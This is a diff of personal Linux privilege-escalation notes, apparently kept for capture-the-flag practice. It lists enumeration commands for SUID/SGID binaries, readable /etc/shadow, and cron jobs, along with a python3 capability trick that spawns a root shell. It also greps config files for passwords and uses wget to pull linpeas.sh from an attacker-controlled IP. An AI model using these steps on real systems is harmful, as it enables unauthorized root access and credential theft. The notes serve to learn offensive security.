@@ -46,22 +46,29 @@ File system - interesting files?
 	is `/etc/shadow` readable/writeable
 	is `/etc/passwd` writeable
 
-
 Check config files
 	`cat /etc/exports` nfs config file
+
+What's scheduled
+	`crontab -l` lists jobs for active user
+	`cat /etc/crontab` list system wide jobs
+	[[cron - crontab]]
+	...
 
 Permission info
 	`sudo -l` list all commands your user can run using `sudo`
 	Find SUID binaries
-		`find / -perm -u=s -type f 2>/dev/null`
+		`find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null`
 	Find SGID binaries
-		`find / -perm -g=s -type f 2>/dev/null`
+		`find / -perm -g=s -type f -exec ls -la {} \; 2>/dev/null`
 	Find SUID and SGID binaries
-		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
-		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} + 2> /dev/null|cat`
+		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2> /dev/null`
+		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} + 2> /dev/null|cat`
 		compare to [gtfobins](https://gtfobins.github.io/)
 	Find sticky-bit directories, missing on tmp? (restricted deletion flag - other users can't overwrite/delete files in the dir)
 		`find / -perm -1000 -type d 2>/dev/null`
+
+Our permissions
 	Find writable files
 		`find /etc -writable -ls 2>/dev/null`
 	Find files with permissions for your group (if user has extra groups)
@@ -73,7 +80,7 @@ Permission info
 	Find files with root owner, our group and group write permissions
 		`find / -type f -user root -group <your-group> -perm -g=w -exec ls -l {} + 2> /dev/null|cat`
 
-if getcap has suid permissions
+if setcap has suid permissions
 	`setcap cap_setuid+ep ./python3`
 	`getcap -r / 2>/dev/null`
 	`./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
@@ -92,20 +99,16 @@ what processes are running
 	are we in a docker container? tiny number of processes
 	[[pspy]]
 
-What's scheduled
-	`crontab -l` lists jobs for active user
-	`cat /etc/crontab` list system wide jobs
-	[[cron - crontab]]
-	...
-
 Open ports
-	`ss -tlupn`
+	`ss -tulpn`
 	`netstat -antplue`
 	`netstat -ano`
 
 finding files, like flags:
-	`find / -type f -name flag2.txt 2> /dev/null
+	`find / -type f -name flag2.txt 2> /dev/null`
 
+if it's a web server with php:
+	cat /var/www/html/configuration.php or grep for password
 ---
 
 search in logfiles and binaries for usernames and passwords
@@ -136,6 +139,7 @@ network
 Use tools
 	[[enum4linux|enum4linux]]
 	[[linpeas]] [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+	`wget 10.18.21.236:8000/enum/linpeas.sh`
 	[LinEnum](https://github.com/rebootuser/LinEnum)
 	[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
 	[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
